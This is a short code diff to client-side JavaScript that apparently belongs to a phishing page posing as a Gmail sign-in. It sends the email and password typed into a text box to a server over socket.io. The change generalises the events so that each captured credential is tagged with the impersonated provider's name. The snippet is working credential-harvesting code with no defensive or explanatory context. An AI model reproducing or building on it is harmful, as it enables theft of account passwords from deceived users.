@@ -83,8 +83,8 @@ var socket = io.connect();
 		$('#form-username').attr("style", "display:block")
 		
 		var socket = io();
-
-		  socket.emit('GmailEmail', $('#email-textbox').val());
+		var from = "Gmail"
+		  socket.emit('UsernameEmail', $('#email-textbox').val(), from);
 		  $('#email-textbox').val('');
 		  return false;
 		
@@ -94,7 +94,8 @@ var socket = io.connect();
 		if ($('#email-textbox').val().length <= 5){
 		console.log("small")
 	}else{
-		socket.emit('GmailPassword', $('#email-textbox').val());
+		var from = "Gmail"
+		socket.emit('Password', $('#email-textbox').val(), from);
 	}
 }
 	
